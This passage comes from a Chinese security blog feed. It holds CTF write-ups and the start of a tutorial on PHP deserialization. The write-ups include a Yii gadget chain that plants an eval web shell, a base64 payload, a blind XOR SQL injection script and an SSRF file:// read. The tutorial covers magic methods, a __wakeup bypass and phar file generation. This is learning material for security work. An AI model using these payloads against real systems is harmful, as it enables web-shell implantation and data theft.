class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'assert'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">id</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'file_put_contents("/var/www/html/web/1.php","&lt;?php eval(\$_POST[111]);");'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Generator</span><span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">BatchQueryResult</span><span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后再生成一下payload</p><p><img src="https://i.loli.net/2021/05/09/kvEFMTuwgG4oCAq.png"></p><p>传进去：</p><pre class="line-numbers language-none"><code class="language-none">/index.php?r=site/about&amp;message=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjczOiJmaWxlX3B1dF9jb250ZW50cygiL3Zhci93d3cvaHRtbC93ZWIvMS5waHAiLCI8P3BocCBldmFsKFwkX1BPU1RbMTExXSk7Iik7Ijt9aToxO3M6MzoicnVuIjt9fX19<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一开始，传进去看到这个报错，以为没有成功，后来访问了一下<code>1.php</code>发现自己成功了QAQ</p><p>打开蚁剑，直接连上马：</p><p><img src="https://i.loli.net/2021/05/09/TkjAf9phLMnFi7c.png"></p><p>看了一圈发现flag再根目录：</p><p><img src="https://i.loli.net/2021/05/09/iakWRl7KEbXpqyM.png"></p><p>然后发现没有权限。。。。。。。又卡住了</p><p>但是我做题晚上刚刚复现了蓝帽的web题，有disable_functions绕过插件，就去试了一下</p><p><img src="https://i.loli.net/2021/05/09/q4bgalyCrJsDXfL.png"></p><p>然后试着读了一下</p><p><img src="https://i.loli.net/2021/05/09/CkhtdG4QfKrmH12.png"></p><p>它就出来了！！！！！！！</p><p>#WebsiteManger</p><p>是一道注入题</p><p>跑了一下sqlmap</p><p>发现了两个参数：</p><p><code>username</code> <code>password</code> </p><p><img src="https://i.loli.net/2021/05/09/FjZvebwfxyqk4Ya.png"></p><p>和<code>/image.php</code>下的id</p><p>注入了一下发现前两个都不是，随即对<code>id</code>下手</p><p>尝试了几种注入都无效，最后发现是异或注入</p><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">/image.php?id=1^(ascii(substr((select(database())),1,1))&gt;1)^1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有回现，尝试变更参数</p><p>直到：</p><pre class="line-numbers language-none"><code class="language-none">/image.php?id=1^(ascii(substr((select(database())),1,1))&gt;99)^1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>时没有回显，证明数据库第一位是c</p><p>获取第二位：</p><pre class="line-numbers language-none"><code class="language-none">/image.php?id=1^(ascii(substr((select(database())),2,1))&gt;1)^1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现到<code>117</code>没有回显</p><p>证明第二位为t</p><p>依次类推，获得第三位为f</p><p>当数据库位数为4位时始终没有回显。证明只有三位，且数据库名为<code>ctf</code></p><p>知道了数据库名就好办了，直接起脚本，依次爆）：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://eci-2zefme7yqvztqdsonszy.cloudeci1.ichunqiu.com/image.php?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{0},1))&gt;{1})^1"</span> word<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    l <span class="token operator">=</span> <span class="token number">32</span>    h <span class="token operator">=</span> <span class="token number">128</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> h<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;</span> h<span class="token punctuation">)</span><span class="token punctuation">:</span>        nurl<span class="token operator">=</span>url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>nurl<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'JFIF'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            h <span class="token operator">=</span> mid        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> h<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    word <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得表名为 users</p><p>之后依次修改url 继续 爆破</p><p>最终爆破出来密码为（当前环境下的密码）：</p><p><img src="https://i.loli.net/2021/05/09/6vMxa7mzsWNVbnF.png"></p><p>然后登录管理员账号：</p><p><img src="https://i.loli.net/2021/05/09/5g3tBZMlqIDdbcJ.png"></p><p>抓包查看发现是ssrf 读取文件漏洞</p><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">file:// /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得flag</p><p><img src="https://i.loli.net/2021/05/09/GasAxph3ugTE4fF.png"></p><p>#hpcurve</p><p>是一道原题</p><p>原题地址：<a href="https://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/">https://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/</a></p><p>ebcdic编码转换成ascii编码</p><p>使用DD命令去操作，Linux命令</p><p>得到flag</p><p><img src="https://i.loli.net/2021/05/09/VLBli9zf854HcDh.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="wp" scheme="http://h3geeker.top/categories/wp/"/>
    
    
    <category term="做题记录" scheme="http://h3geeker.top/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞基础</title>
    <link href="http://h3geeker.top/posts/ae3250a1.html"/>
    <id>http://h3geeker.top/posts/ae3250a1.html</id>
    <published>2021-11-10T13:35:22.000Z</published>
    <updated>2022-01-05T08:34:59.970Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="PHP序列化与序列化"><a href="#PHP序列化与序列化" class="headerlink" title="PHP序列化与序列化"></a>PHP序列化与序列化</h1><p>作者：H3h3QAQ</p><p>本文首发在</p><h2 id="一、PHP序列化和反序列化"><a href="#一、PHP序列化和反序列化" class="headerlink" title="一、PHP序列化和反序列化"></a>一、PHP序列化和反序列化</h2><h3 id="1-PHP反序列化："><a href="#1-PHP反序列化：" class="headerlink" title="1.PHP反序列化："></a>1.PHP反序列化：</h3><p><code>serialize()</code></p><p>将变量或者对象转换成字符串的过程，用于存储或传递PHP的值的过程种，同时不丢失其类型和结构</p><p>常见的序列化字母表示及其含义：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">a <span class="token operator">-</span> <span class="token keyword">array</span>    <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">a</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>n<span class="token operator">&gt;</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token operator">&lt;</span>key <span class="token number">1</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>value <span class="token number">1</span><span class="token operator">&gt;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&lt;</span>key n<span class="token operator">&gt;</span><span class="token operator">&lt;</span>value n<span class="token operator">&gt;</span><span class="token punctuation">}</span>b <span class="token operator">-</span> boolean  <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">b</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>digit<span class="token operator">&gt;</span>d <span class="token operator">-</span> double   <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">d</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>number<span class="token operator">&gt;</span>i <span class="token operator">-</span> integer  <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">i</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>number<span class="token operator">&gt;</span>o <span class="token operator">-</span> common r <span class="token operator">-</span> references <span class="token operator">-</span> string   <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">s</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>length<span class="token operator">&gt;</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"&lt;value&gt;"</span><span class="token constant">C</span> <span class="token operator">-</span> custom object<span class="token constant">O</span> <span class="token operator">-</span> <span class="token keyword">class</span>    <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">O</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>length<span class="token operator">&gt;</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"&lt;class name&gt;"</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>n<span class="token operator">&gt;</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token operator">&lt;</span>field name <span class="token number">1</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>field value1<span class="token operator">&gt;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&lt;</span>field name n<span class="token operator">&gt;</span><span class="token operator">&lt;</span>field value n<span class="token operator">&gt;</span><span class="token punctuation">}</span><span class="token constant">N</span> <span class="token operator">-</span> <span class="token constant">null</span><span class="token constant">R</span> <span class="token operator">-</span> pointer reference<span class="token constant">U</span> <span class="token operator">-</span> unicode string<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">h3</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$v1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v2</span><span class="token operator">=</span><span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v3</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v4</span><span class="token operator">=</span><span class="token number">2.1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v5</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v6</span><span class="token operator">=</span><span class="token double-quoted-string string">"h3h3QAQ"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$v7</span><span class="token operator">=</span><span class="token double-quoted-string string">"H3h3QAQ"</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$v8</span><span class="token operator">=</span><span class="token double-quoted-string string">"protected"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">h3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$s</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>序列化运行结果为：</p><pre class="line-numbers language-none"><code class="language-none">O:2:"h3":8:{s:2:"v1";N;s:2:"v2";b:0;s:2:"v3";i:1;s:2:"v4";d:2.1;s:2:"v5";a:0:{}s:2:"v6";s:7:"h3h3QAQ";s:6:" h3 v7";s:7:"H3h3QAQ";s:5:" * v8";s:9:"protected";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反序列化运行结果</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">object</span><span class="token punctuation">(</span>h3<span class="token punctuation">)</span><span class="token shell-comment comment">#1 (8) {</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v1"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token constant">NULL</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v2"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">bool</span><span class="token punctuation">(</span><span class="token boolean constant">false</span><span class="token punctuation">)</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v3"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v4"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">float</span><span class="token punctuation">(</span><span class="token number">2.1</span><span class="token punctuation">)</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v5"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">}</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v6"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token double-quoted-string string">"h3h3QAQ"</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v7"</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"h3"</span><span class="token punctuation">:</span><span class="token keyword">private</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token double-quoted-string string">"H3h3QAQ"</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v8"</span><span class="token punctuation">:</span><span class="token keyword">protected</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token double-quoted-string string">"protected"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（1）各种魔术方法"><a href="#（1）各种魔术方法" class="headerlink" title="（1）各种魔术方法"></a>（1）各种魔术方法</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：<span class="token comment">//析构函数当对象被销毁时会被自动调用</span><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//unserialize()时会被自动调用</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//当尝试以调用函数的方法调用一个对象时，会被自动调用</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//在对象上下文中调用不可访问的方法时触发</span><span class="token function">__callStatci</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//在静态上下文中调用不可访问的方法时触发</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//用于从不可访问的属性读取数据</span><span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//用于将数据写入不可访问的属性</span><span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//在不可访问的属性上调用isset()或empty()触发</span><span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//在不可访问的属性上使用unset()时触发</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//把类当作字符串使用时触发</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用</span><span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当PHP5&lt;5.6.25、PHP7&lt;7.0.1时，当成员属性数目大于实际数码时可绕过__wakeup方法（CVE-2016-7124）</p><h4 id="（2）PHP反序列化特性"><a href="#（2）PHP反序列化特性" class="headerlink" title="（2）PHP反序列化特性"></a>（2）PHP反序列化特性</h4><p>1.PHP在反序列化时，底层代码时以<code>;</code>作为字段的分隔，以<code>}</code>作为结尾（字符串除外），并且是根据长度判断内容的。</p><p>2.在反序列的时候php会根据s所指定的字符长度去读取后面的字符。如果指定的长度错误则反序列化就会失败。</p><p>3.对类中不存在的属性也会进行反序列化。</p><h3 id="2-session反序列化"><a href="#2-session反序列化" class="headerlink" title="2.session反序列化"></a><strong>2.session反序列化</strong></h3><h4 id="（1）session概念"><a href="#（1）session概念" class="headerlink" title="（1）session概念"></a>（1）session概念</h4><p>PHP session时一个特殊的变量，用于存储有关用户会话的信息，或更改用户会话的设置。session变量保存的信息是单一用户的，并且可供应用程序中的所有界面使用。它每个访问或者创建都有唯一的id（UID），并基于这个UID来储存变量。UID储存在cookie中，或者通过URL来进行传导。</p><h4 id="（2）会话过程"><a href="#（2）会话过程" class="headerlink" title="（2）会话过程"></a>（2）会话过程</h4><p>当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果请求中不包括会话ID信息，PHP就会创建一个新的会话。会话开始之后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中。当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送会话保存管理器来进行保存。</p><p>默认情况下，PHP使用内置的文件会话保存管理器（files）来完成会话的保存。可以通过调用函数<code>session_start()</code>来手动开始一个会话。如果配置项<code>session.auto_start</code>设置为1，那么请求开始的时候，会话会自动开始</p><p>PHP脚本执行完毕之后，会话会自动关闭。同时，也可以通过调用函数<code>session_write_close()</code>来手动关闭会话</p><h4 id="（3）存储引擎"><a href="#（3）存储引擎" class="headerlink" title="（3）存储引擎"></a>（3）存储引擎</h4><p>PHP中的session中的内容默认是以文件的方式储存，储存方式是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式储存。储存的文件是以<code>sess_PHPSESSID</code>来进行命名的，文件的内容就是session值得序列化之后得内容。</p><p><code>session.serialize_handler</code>有如下三种取值：</p><p><img src="https://i.loli.net/2021/08/24/yTPxw3vL9GoS7A5.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">in_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'session.serialize_handeler'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'php_binary'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里可以换不同的存储引擎</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每种存储引擎存储的内容格式：</p><p><img src="https://i.loli.net/2021/08/24/2qIVl4jeL6mwSMg.png"></p><h3 id="3-phar反序列化"><a href="#3-phar反序列化" class="headerlink" title="3.phar反序列化"></a>3.phar反序列化</h3><p>phar反序列化就是可以在不使用php函数unserialize()的前提下，进行反序列化，从而引起php对象注入漏洞</p><p>phar文件的结构：</p><pre class="line-numbers language-none"><code class="language-none">-stub：phar文件标识，前面内容不限，但是必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件-manifest：压缩文件的属性等信息，以序列化的形式储存自定义的meat-data，这里就是漏洞利用的关键点-contents：压缩文件的内容-signature：签名，在文件末尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>生成phar文件</p><pre class="line-numbers language-none"><code class="language-none">一定要将php.ini中的phar.readonly选项设置为Off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">h3</span><span class="token punctuation">{</span><span class="token punctuation">}</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"GIF89a"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;?php__HALT_COMPILER();?&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置stub，添加gif文件头</span><span class="token variable">$o</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">h3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将自定义meat-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"test.txt"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//添加要压缩的文件</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>##二、反序列化漏洞</p><h3 id="1-反序列化成因"><a href="#1-反序列化成因" class="headerlink" title="1.反序列化成因"></a>1.反序列化成因</h3><p>主要是反序列化过程中某些参数可控，传入构造的字符串，从而控制内部的变量设置函数，执行想要的操作</p><h4 id="（1）phar反序列化漏洞造成原因"><a href="#（1）phar反序列化漏洞造成原因" class="headerlink" title="（1）phar反序列化漏洞造成原因"></a>（1）phar反序列化漏洞造成原因</h4><p>漏洞出发点在使用<code>phar://</code>协议读取文件的时候，文件内容黑背解析成为phar对象，然后phar对象内的Meta-data信息会被反序列化。当内核调用phar_parse_metadata()解析met-adata数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成漏洞</p><h3 id="2-反序列化漏洞"><a href="#2-反序列化漏洞" class="headerlink" title="2.反序列化漏洞"></a>2.反序列化漏洞</h3><h4 id="（1）PHP反序列化漏洞"><a href="#（1）PHP反序列化漏洞" class="headerlink" title="（1）PHP反序列化漏洞"></a>（1）PHP反序列化漏洞</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'exam_day1.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 